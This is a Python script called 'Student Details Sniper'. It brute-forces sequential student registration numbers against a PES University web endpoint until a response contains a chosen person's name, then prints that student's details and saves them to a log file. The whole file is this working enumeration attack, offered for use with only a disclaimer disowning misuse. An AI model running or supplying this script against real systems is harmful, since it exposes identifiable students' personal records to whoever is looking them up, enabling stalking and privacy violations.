#!/usr/bin/python3
#       PES University Student Details Sniper - CABREX
#       uses normal brute force and finds out the information
#       of the student with the valid details provided
#       Version - 3.0
#
#       NOTE: I AM NOT RESPONSIBLE FOR THE WRONG USE OF THIS
#       PROGRAM, ANY TROUBLE YOU CAUSE WILL CONFINE TO YOU.

import requests
import os
from datetime import date


def input_variables():

    name = input("Enter the name of the student: ").strip()
    if name == '':
        print("No name entered, exiting...")
        exit(0)

    try:
        campus = int(input("Enter the campus number (1, 2): "))
        if campus == 1 or campus == 2:
            pass
        else:
            print(f"Error, {campus} not found!")
            exit(-1)
    except ValueError:
        print("Please enter only numbers, exiting...")

    try:
        year = int(input("Enter the batch year: "))
        num = year
        year_iter = 0
        while num > 0:
            num = int(num / 10)
            year_iter += 1

        if year_iter == 4:
            if int(year/100) == 20:
                curr_date = str(date.today()).split('-')
                curr_date.remove(curr_date[2])
                if int(year/100) > int(curr_date[0])/100 and int(curr_date[1])/100 < 9:
                    year = year % 100
                else:
                    print(f"{year} batch doesnt exist yet, exiting...")
                    exit(0)
            else:
                print("Enter an year in this decade, exiting...")
                exit(-1)
        elif year_iter == 2:
            curr_date = str(date.today()).split('-')
            curr_date.remove(curr_date[2])
            if year > int(curr_date[0])/100 and int(curr_date[1])/100 < 9:
                print(f"20{year} batch does not exist yet, exiting...")
                exit(0)
        else:
            print("Enter a normal year :|")
            exit(-1)

    except ValueError:
        print("Please enter only numbers, exiting...")

    branch = input("Enter branch(EC, CS, EE): ").strip()

    if len(branch) > 2 or branch.isdigit() or branch == '':
        print("Please pick a valid branch, exiting...")
        exit(-1)

    return name, campus, year, branch


def attack_vector(name, campus, year, branch):
    counter = 0

    disconnect_counter = 0
    disconnect_status_array = []

    print("\nAttack in progress...")

    print("\nDetails: ")
    print(f"Name: {name}")
    print(f"Campus: {campus}")
    print(f"Year: 20{year}")
    print(f"Branch: {branch}\n")

    while 1000 > counter:
        SRN = f"PES{campus}UG{year}{branch.upper()}{counter:03}"
        payload = {"loginId": f"{SRN}"}

        response = requests.post("https://www.pesuacademy.com/Academy/getStudentClassInfo", data=payload)
        print(f"Trying SRN number: {SRN}", end="\r")

        if response.status_code == 200:
            if response.text.lower().find(name.lower()) != -1:
                print(response.text.strip())
                print()
                print("FOUND IT!")
                if not os.path.isdir("./logs"):
                    os.mkdir("./logs")
                if not os.path.isdir(f"./logs/20{year}"):
                    os.mkdir(f"./logs/20{year}")
                with open(f"./logs/20{year}/{name.lower().replace(' ', '_')}_details.html", 'w', encoding='utf-8') as file_handle:
                    file_handle.write(response.text.strip())
                print(f"written to file \"./logs/20{year}/{name.lower().replace(' ', '_')}_details.html\"")
                exit(1)

            if disconnect_counter != 0:
                disconnect_status_array.remove(disconnect_status_array[disconnect_counter])
                disconnect_counter -= 1
        else:
            disconnect_counter += 1
            disconnect_status_array.append(response.status_code)
            if disconnect_counter > 3:
                print()
                print("Session timeout")
                print("ATTACK FAILED")
                print(f"List of status codes: {disconnect_status_array}")
                exit(-1)

        counter = counter + 1

    print(f"Could not find details of student \"{name}\" with details provided")


if __name__ == "__main__":
    print("PES University Student Details Sniper - CABREX")
    name, campus, year, branch = input_variables()
    attack_vector(name, campus, year, branch)

